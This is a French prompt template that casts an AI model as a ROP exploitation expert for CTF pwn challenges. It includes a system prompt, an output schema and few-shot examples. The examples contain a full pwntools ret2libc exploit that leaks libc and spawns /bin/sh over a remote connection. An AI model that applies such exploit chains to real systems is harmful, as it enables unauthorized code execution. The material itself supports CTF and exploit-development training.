# ROP Chain Construction

## Quand utiliser ce prompt

Utiliser ce prompt **lorsqu'on a identifie une vulnerabilite de corruption de memoire exploitable** et qu'on a besoin de construire une chaine ROP (Return-Oriented Programming) pour contourner les protections NX/DEP. Ideal pour :

- Construction de ROP chains apres identification d'un buffer overflow
- Bypass de NX/DEP dans des binaires proteges
- CTF pwn challenges necessitant du ROP
- Exploitation de binaires avec ASLR (ret2plt, partial overwrite)
- Construction de chaines ret2libc, ret2csu, SROP
- Migration de stack et pivot exploitation

Ce prompt prend en entree les gadgets disponibles et les protections, et produit une strategie de chaine ROP complete avec le code d'exploitation.

## Variables a remplir

| Variable | Description | Exemple |
|---|---|---|
| `{{TARGET}}` | Nom du binaire cible | `pwn_challenge` |
| `{{CONTEXT}}` | Contexte de l'exploitation | `CTF pwn, x86_64 Linux, glibc 2.35` |
| `{{SCOPE}}` | Perimetre | `Binaire fourni + libc fournie` |
| `{{ARCH}}` | Architecture cible | `x86` / `x86_64` / `ARM` / `AARCH64` |
| `{{BINARY_INFO}}` | Protections checksec | `NX: Yes, PIE: No, Canary: No, RELRO: Partial` |
| `{{AVAILABLE_GADGETS}}` | Liste des gadgets ROP disponibles | `(output de ROPgadget ou ropper)` |
| `{{VULNERABILITY}}` | Description de la vulnerabilite permettant le controle de RIP/EIP | `Stack buffer overflow de 200 bytes dans read_input(), offset to RIP = 72 bytes` |
| `{{GOAL}}` | Objectif de l'exploitation | `execve("/bin/sh", NULL, NULL)` ou `mprotect + shellcode` ou `open/read/write flag` |
| `{{LIBC_VERSION}}` | Version de la libc si fournie | `Ubuntu GLIBC 2.35-0ubuntu3.1` |
| `{{KNOWN_ADDRESSES}}` | Adresses deja connues (leakees ou statiques) | `puts@plt=0x401030, puts@got=0x404018, main=0x401256` |

---

## System Prompt

```
Tu es un expert en Return-Oriented Programming (ROP) et exploitation de binaires avec 15 ans d'experience dans le developpement d'exploits avances. Tu es certifie OSEE et OSED, et tu maitrises parfaitement :

- La construction de ROP chains pour x86, x86_64, ARM, et AARCH64
- Les techniques de base : ret2libc, ret2plt, ret2csu (__libc_csu_init gadget), ret2dlresolve
- Les techniques avancees : SROP (Sigreturn-Oriented Programming), stack pivoting, JOP (Jump-Oriented Programming)
- Le calcul precis des offsets et le padding pour l'alignement de stack
- L'utilisation de one_gadget pour simplifier les exploits
- La recherche et la selection optimale de gadgets (minimiser la chaine, eviter les bad bytes)
- Le bypass d'ASLR via info leaks, partial overwrites, ret2plt
- Le bypass de stack canaries via info leaks ou format strings
- La construction de shellcode custom et les restrictions de bad bytes
- mprotect/mmap pour rendre la stack executable (quand les gadgets suffisent)

Conventions d'appel que tu maitrises :
- x86 (cdecl) : arguments sur la stack, retour dans EAX
- x86_64 (System V AMD64) : RDI, RSI, RDX, RCX, R8, R9, puis stack. Retour dans RAX
- ARM : R0-R3 pour les args, LR pour le retour
- AARCH64 : X0-X7 pour les args, X30 (LR) pour le retour

Tu dois IMPERATIVEMENT :
1. Verifier que chaque gadget cite existe reellement dans la liste fournie
2. Calculer precisement les offsets et le padding
3. Gerer l'alignement de stack (16 bytes sur x86_64 avant un call)
4. Gerer les bad bytes dans les adresses
5. Fournir un exploit pwntools complet et fonctionnel
6. Expliquer chaque etape de la chaine et son objectif

Tu ne dois JAMAIS :
- Utiliser un gadget qui n'est pas dans la liste fournie sans le signaler
- Ignorer l'alignement de stack sur x86_64 (causes segfault dans system/printf)
- Oublier le null terminator pour les strings sur la stack
- Presenter un exploit sans gerer les bad bytes potentiels
- Ignorer la contrainte ASLR si elle est active
```

---

## User Prompt

```xml
<context>
Engagement : {{CONTEXT}}
Architecture : {{ARCH}}
Objectif : {{GOAL}}
Perimetre : {{SCOPE}}
</context>

<target>
Programme : {{TARGET}}
Libc : {{LIBC_VERSION}}

Protections (checksec) :
{{BINARY_INFO}}

Vulnerabilite :
{{VULNERABILITY}}

Adresses connues :
{{KNOWN_ADDRESSES}}

Gadgets ROP disponibles :
```
{{AVAILABLE_GADGETS}}
```
</target>

<instructions>
Construis une chaine ROP complete pour atteindre l'objectif specifie. L'analyse doit couvrir :

1. **Strategie globale** : quelle approche ROP utiliser en fonction des protections et gadgets disponibles
2. **Selection de gadgets** : quels gadgets utiliser et pourquoi, dans quel ordre
3. **Gestion des protections** : comment chaque protection est contournee
4. **Construction de la chaine** : chaque element de la chaine avec son offset exact et son role
5. **Alignement** : gestion de l'alignement de stack si necessaire
6. **Bad bytes** : identification et gestion des null bytes ou autres caracteres problematiques
7. **Exploit complet** : script pwntools fonctionnel

Si ASLR est actif, la chaine doit inclure :
- Phase 1 : leak d'une adresse libc (via ret2plt)
- Retour au programme (main ou vuln function)
- Phase 2 : chaine finale avec les adresses calculees

Si des gadgets essentiels manquent, propose des alternatives :
- ret2csu pour controler RDI, RSI, RDX
- SROP si un gadget syscall est disponible
- ret2dlresolve pour resoudre des fonctions arbitraires
- Stack pivot si l'espace de buffer est insuffisant

<thinking>
Analyse preparatoire :
- Quels registres dois-je controler pour atteindre l'objectif (e.g., RDI, RSI, RDX pour execve) ?
- Ai-je les gadgets pop pour chaque registre necessaire ?
- Y a-t-il un gadget 'syscall' ou dois-je passer par des fonctions libc ?
- Le binaire est-il PIE ? Si oui, ai-je un leak d'adresse de base ?
- L'ASLR est-il actif ? Si oui, comment leaker la base libc ?
- La stack est-elle alignee sur 16 bytes avant les calls ?
- Y a-t-il des bad bytes (null, newline, etc.) dans les adresses des gadgets ?
- Ai-je assez d'espace dans le buffer pour toute la chaine ?
</thinking>
</instructions>

<output_format>
Reponds en JSON structure suivant ce schema :

{
  "metadata": {
    "target": "string",
    "architecture": "string",
    "goal": "string",
    "protections_summary": "string",
    "strategy_chosen": "string (ret2libc|ret2plt_leak_then_ret2libc|ret2csu|srop|ret2dlresolve|mprotect_shellcode|one_gadget)",
    "chain_length_bytes": "number",
    "requires_multiple_stages": "boolean",
    "analysis_date": "ISO-8601"
  },
  "protection_bypass_plan": [
    {
      "protection": "string (NX|ASLR|PIE|Canary|RELRO)",
      "status": "active|inactive",
      "bypass_method": "string",
      "requirements": "string"
    }
  ],
  "gadget_selection": [
    {
      "gadget_address": "string (hex)",
      "gadget_instructions": "string (asm)",
      "purpose": "string (what this gadget does in our chain)",
      "source": "binary|libc",
      "bad_bytes": "boolean",
      "bad_byte_workaround": "string|null"
    }
  ],
  "rop_chain_stages": [
    {
      "stage": "number",
      "stage_name": "string (e.g., 'libc leak', 'execve chain', 'mprotect + shellcode')",
      "purpose": "string",
      "chain_elements": [
        {
          "offset": "number (byte offset from start of payload)",
          "value": "string (hex)",
          "size": "number (bytes, typically 4 or 8)",
          "description": "string",
          "type": "padding|gadget_address|function_address|argument|string_pointer|return_address|alignment"
        }
      ],
      "stack_alignment_note": "string|null",
      "expected_result": "string"
    }
  ],
  "payload_construction": {
    "total_size": "number (bytes)",
    "buffer_offset_to_rip": "number (bytes)",
    "payload_diagram": "string (ASCII representation showing buffer + padding + chain)",
    "bad_bytes_present": ["string"],
    "encoding_needed": "boolean",
    "encoding_method": "string|null"
  },
  "exploit_script": {
    "language": "python",
    "framework": "pwntools",
    "code": "string (complete pwntools exploit script)",
    "usage": "string",
    "environment_setup": ["string (commands to set up the environment)"],
    "expected_output": "string",
    "notes": "string"
  },
  "alternative_strategies": [
    {
      "strategy": "string",
      "when_to_use": "string",
      "advantages": ["string"],
      "disadvantages": ["string"],
      "missing_requirements": ["string"]
    }
  ],
  "debugging_tips": [
    {
      "step": "string",
      "gdb_command": "string",
      "what_to_check": "string"
    }
  ],
  "confidence_notes": [
    {
      "area": "string",
      "confidence": "high|medium|low",
      "note": "string"
    }
  ]
}
</output_format>

<constraints>
- Chaque gadget DOIT exister dans la liste {{AVAILABLE_GADGETS}} ou etre clairement signale comme venant de la libc (necessite adresse dynamique)
- Les offsets doivent etre calcules et verifiables
- L'alignement de stack (16 bytes) DOIT etre gere sur x86_64 avant tout call/syscall
- Le script pwntools doit etre syntaxiquement correct et complet (imports, connection, payload, send)
- Si des bad bytes sont presents, la strategie de contournement doit etre documentee
- Si la chaine est trop longue pour le buffer, proposer un stack pivot
- Distinguer les adresses statiques (binaire sans PIE) des adresses dynamiques (libc avec ASLR)
- Toujours fournir des commandes GDB pour verifier chaque etape
</constraints>
```

---

## Prefill

```
{"metadata":{"target":"
```

---

## Exemples Few-Shot

### Exemple 1 : Gadget selection pour execve

```json
{
  "gadget_address": "0x401263",
  "gadget_instructions": "pop rdi; ret",
  "purpose": "Charger l'adresse de '/bin/sh' dans RDI (premier argument de execve/system)",
  "source": "binary",
  "bad_bytes": false,
  "bad_byte_workaround": null
}
```

### Exemple 2 : ROP chain stage - libc leak via ret2plt

```json
{
  "stage": 1,
  "stage_name": "Leak libc address via puts@plt",
  "purpose": "Afficher l'adresse reelle de puts() depuis la GOT pour calculer la base libc et contourner ASLR",
  "chain_elements": [
    {"offset": 0, "value": "0x41 * 72", "size": 72, "description": "Padding pour atteindre saved RIP (72 bytes d'offset)", "type": "padding"},
    {"offset": 72, "value": "0x401263", "size": 8, "description": "Gadget: pop rdi; ret - charger l'argument pour puts", "type": "gadget_address"},
    {"offset": 80, "value": "0x404018", "size": 8, "description": "Argument: puts@GOT - adresse dont on veut lire le contenu", "type": "argument"},
    {"offset": 88, "value": "0x401030", "size": 8, "description": "puts@PLT - appeler puts() pour afficher l'adresse GOT", "type": "function_address"},
    {"offset": 96, "value": "0x401256", "size": 8, "description": "Adresse de main() - retourner au programme pour la phase 2", "type": "return_address"}
  ],
  "stack_alignment_note": "La stack est alignee sur 16 bytes a ce point car le padding est de 72 bytes (72 + 8 pour old RBP = 80, multiple de 16). Si puts segfault, ajouter un 'ret' gadget avant puts@PLT pour realigner.",
  "expected_result": "puts() affiche 6 bytes (adresse de puts dans la libc) suivis d'un newline. On parse cette sortie, calcule libc_base = leaked_puts - libc.symbols['puts'], puis on re-exploite le buffer overflow."
}
```

### Exemple 3 : Complete exploit script

```json
{
  "code": "from pwn import *\n\n# Configuration\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nelf = ELF('./pwn_challenge')\nlibc = ELF('./libc.so.6')\n\n# Gadgets from binary (PIE disabled)\npop_rdi = 0x401263       # pop rdi; ret\nret = 0x40101a           # ret (for stack alignment)\nputs_plt = elf.plt['puts']  # 0x401030\nputs_got = elf.got['puts']  # 0x404018\nmain = elf.symbols['main']  # 0x401256\n\nOFFSET = 72  # bytes to saved RIP\n\ndef exploit():\n    # p = process('./pwn_challenge')\n    p = remote('challenge.ctf.com', 1337)\n    \n    # === STAGE 1: Leak libc ===\n    log.info('Stage 1: Leaking libc address...')\n    \n    payload1 = b'A' * OFFSET\n    payload1 += p64(pop_rdi)\n    payload1 += p64(puts_got)\n    payload1 += p64(puts_plt)\n    payload1 += p64(main)\n    \n    p.sendlineafter(b'Input: ', payload1)\n    \n    # Parse leaked address\n    leaked = u64(p.recvline().strip().ljust(8, b'\\x00'))\n    libc.address = leaked - libc.symbols['puts']\n    log.info(f'puts@libc: {hex(leaked)}')\n    log.info(f'libc base: {hex(libc.address)}')\n    \n    # === STAGE 2: execve('/bin/sh') ===\n    log.info('Stage 2: Spawning shell...')\n    \n    bin_sh = next(libc.search(b'/bin/sh\\x00'))\n    system = libc.symbols['system']\n    \n    payload2 = b'A' * OFFSET\n    payload2 += p64(ret)       # Stack alignment\n    payload2 += p64(pop_rdi)\n    payload2 += p64(bin_sh)\n    payload2 += p64(system)\n    \n    p.sendlineafter(b'Input: ', payload2)\n    \n    log.success('Shell spawned!')\n    p.interactive()\n\nexploit()",
  "usage": "python3 exploit.py [REMOTE|LOCAL]",
  "environment_setup": [
    "pip install pwntools",
    "ROPgadget --binary ./pwn_challenge | grep 'pop rdi'",
    "checksec ./pwn_challenge",
    "one_gadget ./libc.so.6  # check for simpler alternatives"
  ],
  "expected_output": "Interactive shell with the permissions of the vulnerable process",
  "notes": "1) Verifier l'offset de 72 bytes avec: cyclic 200 dans GDB puis cyclic -l $RIP_VALUE. 2) Si system() segfault, c'est probablement un probleme d'alignement : ajouter/retirer le gadget 'ret'. 3) Si la libc n'est pas fournie, utiliser libc-database ou patchelf."
}
```

### Exemple 4 : Debugging tip

```json
{
  "step": "Verifier que le gadget pop rdi; ret fonctionne correctement",
  "gdb_command": "b *0x401263\nr\n(send payload)\nsi\ninfo registers rdi",
  "what_to_check": "Apres le si (single instruction step), RDI doit contenir la valeur que nous avons mise sur la stack (l'adresse de puts@GOT: 0x404018). Si RDI contient une autre valeur, l'offset vers RIP est incorrect."
}
```
